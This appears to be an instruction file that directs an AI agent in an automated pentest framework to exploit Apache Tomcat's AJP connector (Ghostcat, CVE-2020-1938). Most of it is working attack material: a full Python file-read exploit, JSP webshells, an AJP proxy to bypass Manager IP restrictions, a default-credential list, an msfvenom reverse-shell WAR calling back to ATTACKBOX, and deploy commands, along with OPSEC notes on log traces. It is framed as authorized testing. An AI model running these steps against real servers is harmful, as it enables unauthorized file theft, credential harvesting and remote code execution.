# AJP / Ghostcat (CVE-2020-1938)

You are helping a penetration tester exploit Apache JServ Protocol (AJP)
misconfigurations and Ghostcat (CVE-2020-1938). AJP is a binary protocol used
for communication between a front-end web server and Tomcat. When the AJP
connector is exposed (typically port 8009), it enables arbitrary file read from
the webapp directory and, with a file upload primitive, remote code execution.
All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[ajp-ghostcat] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## Scope Boundary

This skill covers AJP protocol exploitation — Ghostcat file read, AJP attribute
injection for JSP inclusion, and AJP proxy bypass to access restricted Tomcat
management interfaces. When you reach the boundary of this scope — whether
through completing your methodology or discovering findings outside your domain — **STOP**.

Do not load or execute another skill. Do not continue past your scope boundary.
Instead, return to the orchestrator with:
  - What was found (vulns, credentials, access gained)
  - Context to pass (injection point, target, working payloads, etc.)

The orchestrator decides what runs next. Your job is to execute this skill
thoroughly and return clean findings.

**Stay in methodology.** Only use techniques documented in this skill. If you
encounter a scenario not covered here, note it and return — do not improvise
attacks, write custom exploit code, or apply techniques from other domains.
The orchestrator will provide specific guidance or route to a different skill.

## State Management

Call `get_state_summary()` from the state MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Exploit and Tool Transfer

Never download exploits, scripts, or tools directly to the target from the
internet (`curl https://github.com/...`, `git clone` on target). Targets may
lack outbound internet access, and operators must review files before they
reach the target.

**Attackbox-first workflow:**

1. **Download on attackbox** — `git clone`, `curl`, `searchsploit -m` locally
2. **Review** — inspect source code or binary provenance before transferring
3. **Serve** — `python3 -m http.server 8080` from the directory containing the file
4. **Pull from target** — `wget http://ATTACKBOX:8080/file -O /tmp/file` or
   `curl http://ATTACKBOX:8080/file -o /tmp/file`

**Alternatives when HTTP is not viable:** `scp`/`sftp` (if SSH exists),
`nc` file transfer, base64-encode and paste, or
`impacket-smbserver share . -smb2support` on attackbox.

**Inline source code** written via heredoc in this skill does not need this
workflow — the operator can read the code directly.

## Prerequisites

- AJP port open (typically 8009) with network access from the attackbox
- Apache Tomcat running behind the AJP connector
- For Ghostcat file read: Tomcat < 9.0.31, < 8.5.51, or < 7.0.100
- For JSP inclusion RCE: a file upload primitive somewhere in the application
- For AJP proxy attack: AJP port accessible + Tomcat Manager deployed
- Tools: `nmap`, `ajpShooter.py` (`pip install ajpShooter`), or Python 3
  (for inline PoC)

## Step 1: Assess

If not already provided by the orchestrator or conversation context, determine:
1. **AJP port** — is port 8009 (or non-standard AJP port) open?
2. **Tomcat version** — can we fingerprint from HTTP headers, error pages, or
   nmap scripts?
3. **Webapp context paths** — ROOT, manager, host-manager, custom apps?
4. **HTTP access** — is port 8080/8443 also exposed? What does Tomcat Manager
   show?
5. **AJP secret** — is `requiredSecret` configured? (blocks unauthenticated AJP)

```bash
# Scan for AJP port and Tomcat HTTP
nmap -sV -p 8009,8080,8443 TARGET

# Detailed AJP enumeration with NSE scripts
nmap -sV -p 8009 --script ajp-auth,ajp-headers,ajp-methods,ajp-request TARGET
```

If nmap shows AJP port as open and responding, proceed. If filtered or closed,
this skill does not apply — check if a firewall is in the way or if AJP is
bound to localhost only.

Skip if context was already provided.

## Step 2: Enumerate AJP Service

Confirm AJP is responding and gather information:

```bash
# Confirm AJP responds (ajp-request sends a GET via AJP and shows the response)
nmap -sV -p 8009 --script ajp-request TARGET

# Check supported methods
nmap -p 8009 --script ajp-methods TARGET

# Check authentication requirements
nmap -p 8009 --script ajp-auth TARGET
```

If AJP responds with a page, note the Tomcat version from response headers or
page content. If AJP returns a connection reset or authentication error,
`requiredSecret` may be configured — see Troubleshooting.

## Step 3: Ghostcat File Read (CVE-2020-1938)

Ghostcat exploits the AJP connector's ability to set internal request attributes
(`javax.servlet.include.request_uri`, `javax.servlet.include.path_info`,
`javax.servlet.include.servlet_path`). This lets an attacker read any file
within any webapp's directory as if it were a JSP — but the file is returned
raw (not executed) when it lacks valid JSP syntax.

**Vulnerable versions:** Tomcat < 9.0.31, < 8.5.51, < 7.0.100

### Variant A: ajpShooter.py

```bash
# Install ajpShooter
pip install ajpShooter

# Read /WEB-INF/web.xml from ROOT context
ajpShooter.py http://TARGET 8009 /WEB-INF/web.xml read

# Read from a specific webapp context
ajpShooter.py http://TARGET 8009 /manager/WEB-INF/web.xml read
ajpShooter.py http://TARGET 8009 /host-manager/WEB-INF/web.xml read
```

### Variant B: Inline Python AJP PoC

Use this when ajpShooter is unavailable. This compact script implements the AJP
1.3 protocol directly — no dependencies beyond Python 3 stdlib.

```python
#!/usr/bin/env python3
"""Ghostcat (CVE-2020-1938) file read PoC — AJP 1.3 protocol."""
import socket, struct, sys

def pack_string(s):
    """Pack a string into AJP format: 2-byte length + data + null."""
    if s is None:
        return struct.pack(">h", -1)
    s = s.encode() if isinstance(s, str) else s
    return struct.pack(">H", len(s)) + s + b"\x00"

def ajp_forward_request(target, port, file_path, context="/"):
    """Send an AJP FORWARD_REQUEST to read a file via attribute injection."""
    # AJP request attributes that trigger file inclusion
    attributes = b""
    # javax.servlet.include.request_uri (attribute code 0x0E = 14)
    attributes += b"\x0E" + pack_string(context)
    # javax.servlet.include.servlet_path (attribute code 0x0F = 15)
    attributes += b"\x0F" + pack_string(file_path)
    # Terminator
    attributes += b"\xFF"

    # Build AJP FORWARD_REQUEST (type 2) for GET method
    body = b"\x02"              # prefix_code: FORWARD_REQUEST
    body += b"\x02"             # method: GET
    body += pack_string("HTTP/1.1")   # protocol
    body += pack_string(context)      # req_uri
    body += pack_string(target)       # remote_addr
    body += pack_string(target)       # remote_host
    body += pack_string(target)       # server_name
    body += struct.pack(">H", port)   # server_port
    body += b"\x00"             # is_ssl: false
    # Headers: Host only (count = 1)
    body += struct.pack(">H", 1)
    body += b"\xA0\x0B"        # Host header code
    body += pack_string(target)
    # Attributes
    body += attributes

    # Wrap in AJP packet: magic (0x1234) + length + body
    packet = b"\x12\x34" + struct.pack(">H", len(body)) + body

    # Send and receive
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((target, port))
    sock.send(packet)

    # Read response
    data = b""
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
    sock.close()

    # Extract response body — skip AJP response headers
    # Look for the SEND_BODY_CHUNK marker (type 3)
    result = b""
    offset = 0
    while offset < len(data):
        if offset + 4 > len(data):
            break
        magic = struct.unpack(">H", data[offset:offset+2])[0]
        length = struct.unpack(">H", data[offset+2:offset+4])[0]
        if offset + 4 + length > len(data):
            chunk_data = data[offset+4:]
        else:
            chunk_data = data[offset+4:offset+4+length]
        # SEND_BODY_CHUNK: prefix_code = 0x03
        if len(chunk_data) > 0 and chunk_data[0] == 0x03:
            if len(chunk_data) > 3:
                body_len = struct.unpack(">H", chunk_data[1:3])[0]
                result += chunk_data[3:3+body_len]
        offset += 4 + length
    return result.decode(errors="replace")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target> <port> [file] [context]")
        print(f"Example: {sys.argv[0]} 10.10.10.5 8009 /WEB-INF/web.xml /")
        sys.exit(1)
    host = sys.argv[1]
    port = int(sys.argv[2])
    fpath = sys.argv[3] if len(sys.argv) > 3 else "/WEB-INF/web.xml"
    ctx = sys.argv[4] if len(sys.argv) > 4 else "/"
    print(ajp_forward_request(host, port, fpath, ctx))
```

### Target Files to Read

Read these files across all webapp contexts (ROOT `/`, `/manager`,
`/host-manager`, any custom apps discovered):

| File | Contains |
|---|---|
| `/WEB-INF/web.xml` | Servlet mappings, security constraints, init params |
| `/WEB-INF/classes/application.properties` | Spring Boot config, DB creds, API keys |
| `/WEB-INF/classes/db.properties` | Database connection strings |
| `/META-INF/context.xml` | JNDI datasources with DB credentials |
| `/WEB-INF/web.properties` | Application configuration |
| `/WEB-INF/spring-*.xml` | Spring framework config with bean definitions |

```bash
# Read from ROOT context
ajpShooter.py http://TARGET 8009 /WEB-INF/web.xml read
ajpShooter.py http://TARGET 8009 /WEB-INF/classes/application.properties read
ajpShooter.py http://TARGET 8009 /META-INF/context.xml read

# Read from manager context
ajpShooter.py http://TARGET 8009 /manager/WEB-INF/web.xml read

# Read from host-manager context
ajpShooter.py http://TARGET 8009 /host-manager/WEB-INF/web.xml read
```

Save all file contents to `engagement/evidence/` for analysis.

## Step 4: Ghostcat JSP Inclusion (RCE)

When you have a **file upload primitive** anywhere in the application (or can
write to a path accessible by Tomcat), you can achieve RCE by combining file
upload with AJP attribute injection to force Tomcat to process an uploaded file
as JSP.

**Requirements:**
- A file upload endpoint that stores files at a known or predictable path
- OR a writable path within the Tomcat docroot
- AJP port accessible (Ghostcat-vulnerable version)

### How It Works

1. Upload a file containing JSP code (can have any extension — `.txt`, `.png`,
   `.xml` — Tomcat processes it as JSP because of the AJP attribute injection)
2. Use AJP to include the uploaded file with `javax.servlet.include.servlet_path`
   pointing to the uploaded file's path
3. Tomcat compiles and executes the file as JSP

### JSP Webshell Payload

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) { out.println(line); }
    br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    while ((line = br.readLine()) != null) { out.println(line); }
}
%>
```

### Exploitation

```bash
# Upload the JSP payload via the file upload endpoint (adapt to the target)
# Example: if upload stores to /uploads/shell.txt
curl -F "file=@shell.jsp;filename=shell.txt" http://TARGET:8080/upload

# Include the uploaded file as JSP via AJP attribute injection
ajpShooter.py http://TARGET 8009 /uploads/shell.txt eval

# Execute commands via the included JSP
# The eval mode sends the request with the include attributes set
# and the file is processed as JSP by Tomcat
```

If the uploaded file's path is unknown, check the upload response for a file
path or URL, or try common paths: `/uploads/`, `/tmp/`, `/attachments/`,
`/static/uploads/`.

## Step 5: AJP Proxy Attack — Bypass Tomcat Manager Restrictions

Tomcat Manager is often restricted to localhost connections via the
`RemoteAddrValve` in `META-INF/context.xml`:

```xml
<Valve className="org.apache.catalina.valves.RemoteAddrValve"
       allow="127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1" />
```

When AJP is exposed, you can proxy through it — the connection to Tomcat
arrives from your proxy on localhost (or the proxy host), bypassing the IP
restriction.

### Variant A: Apache with mod_proxy_ajp

```bash
# Install Apache (if not present)
sudo apt install apache2 libapache2-mod-proxy-html

# Enable required modules
sudo a2enmod proxy proxy_ajp

# Create proxy config
cat > /tmp/ajp-proxy.conf << 'EOF'
<VirtualHost *:8888>
    ProxyPass / ajp://TARGET:8009/
    ProxyPassReverse / ajp://TARGET:8009/
</VirtualHost>
EOF

sudo cp /tmp/ajp-proxy.conf /etc/apache2/sites-available/ajp-proxy.conf
sudo a2ensite ajp-proxy
sudo apachectl restart

# Access Tomcat Manager through the proxy
curl http://127.0.0.1:8888/manager/html
```

### Variant B: nginx with ngx_http_upstream_jk_module

nginx requires compilation with AJP support or use of a third-party module.
Apache with mod_proxy_ajp is simpler and preferred.

```nginx
# nginx.conf (requires AJP module compiled in)
upstream tomcat_ajp {
    server TARGET:8009;
}

server {
    listen 8888;
    location / {
        ajp_pass tomcat_ajp;
    }
}
```

### Variant C: Python AJP proxy (no root required)

Use AJPy for a lightweight AJP proxy that requires no web server installation:

```bash
# Install AJPy
pip install ajpy

# Proxy requests to Tomcat Manager via AJP
python -m ajpy.ajp_forward TARGET 8009 /manager/html --method GET
```

### Access Tomcat Manager

Once proxied, try default credentials:

| Username | Password |
|---|---|
| `tomcat` | `tomcat` |
| `tomcat` | `s3cret` |
| `admin` | `admin` |
| `admin` | `tomcat` |
| `manager` | `manager` |
| `role1` | `tomcat` |
| `both` | `tomcat` |
| `root` | `root` |

Also check credentials extracted from `web.xml` or `tomcat-users.xml` via
Ghostcat file read (Step 3).

### WAR Deploy for RCE

Once authenticated to Tomcat Manager:

```bash
# Generate a WAR webshell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKBOX LPORT=4444 -f war -o shell.war

# Deploy via Manager
curl -u 'tomcat:s3cret' --upload-file shell.war \
  "http://127.0.0.1:8888/manager/text/deploy?path=/shell&update=true"

# Trigger the shell
curl http://127.0.0.1:8888/shell/

# Or use a simpler JSP webshell in a WAR:
mkdir -p /tmp/warshell && cat > /tmp/warshell/cmd.jsp << 'JSPEOF'
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String l; while ((l = br.readLine()) != null) out.println(l);
}
%>
JSPEOF
cd /tmp/warshell && jar -cvf ../cmd.war cmd.jsp

# Deploy the WAR
curl -u 'tomcat:s3cret' --upload-file /tmp/cmd.war \
  "http://127.0.0.1:8888/manager/text/deploy?path=/cmd&update=true"

# Execute commands
curl "http://127.0.0.1:8888/cmd/cmd.jsp?cmd=id"
```

## Step 6: Escalate or Pivot

## OPSEC Notes

- **AJP requests** appear in Tomcat's `localhost_access_log` — each file read
  generates a log entry
- **WAR deployment** is very noisy — creates files on disk, logged by Manager,
  visible to any admin checking deployed applications
- **AJP proxy setup** is entirely local to the attackbox — no target-side
  artifacts beyond normal AJP log entries
- **Ghostcat file read** is relatively quiet — looks like a normal AJP request
  in logs, but reading `/WEB-INF/` paths may trigger security monitoring if
  Tomcat access logs are analyzed
- **Nmap script scans** on port 8009 generate AJP protocol traffic that IDS
  may flag

## Troubleshooting

### AJP Port Filtered / Connection Refused
- AJP may be bound to localhost only (common in production) — check if you have
  access from an internal host or via SSRF
- A firewall may block port 8009 — check if non-standard ports are in use
- Use `nmap -sV -p 1-65535 TARGET` for a full port scan

### requiredSecret Configured
- Tomcat 9.0.31+, 8.5.51+, and 7.0.100+ require `secret` attribute by default
- If you can read `server.xml` via another vuln, look for the secret value:
  `<Connector port="8009" protocol="AJP/1.3" secretRequired="true" secret="..."/>`
- ajpShooter supports the `--ajp_secret` flag if you have the secret
- If secret is set and unknown, this attack path is blocked — note in the engagement state

### Ghostcat Returns Empty Response
- The target file may not exist — try different context paths (`/`, `/ROOT/`,
  application-specific paths)
- The webapp may be empty — try `/manager/WEB-INF/web.xml` or
  `/host-manager/WEB-INF/web.xml`
- Tomcat may be patched — verify version from HTTP headers or error pages

### Tomcat Manager Not Available
- Manager webapp may not be deployed — check for 404 vs 403
- 403 means deployed but IP-restricted — use AJP proxy bypass (Step 5)
- 404 means not deployed — focus on Ghostcat file read and other attack paths

### AJP Proxy Returns 502 / 503
- Verify AJP port is correct and Tomcat is running
- Check `ProxyPass` target matches exactly: `ajp://TARGET:8009/`
- Ensure the AJP connector is enabled in Tomcat's `server.xml`
- Try `curl -v` to see detailed error from the proxy

### No File Upload for JSP Inclusion RCE
- Look for file upload endpoints in the webapp (check web.xml for servlet
  mappings, look for multipart form handlers)
- Check if Tomcat's `DefaultServlet` has `readonly=false` (allows PUT)
- If no upload primitive exists, focus on credential extraction from config
  files and lateral movement
